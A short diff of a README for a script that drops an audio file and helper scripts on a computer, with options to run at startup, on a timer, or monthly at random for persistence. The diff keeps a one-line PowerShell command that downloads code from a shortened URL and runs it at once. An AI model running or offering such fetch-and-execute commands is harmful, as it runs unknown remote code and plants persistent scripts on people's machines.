@@ -4,10 +4,10 @@ A small script that drops an audio file and a few helper scripts on the computer
 Depending on the option you choose it can either run instantly on startup, run after a set time interval or it can be scheduled to run once a month at random (persistence).
 The timed scripts are not persistent, they clean up after themselves once run.
 
-## One time run
+## One time run (powershell)
 
 Attention: "This will trigger anti-attack surface rules if they are set up on your network."
-Quick deploy (instant version) via powershell
+
 ```powershell irm https://is.gd/droptestjck1 | iex ```
 
 
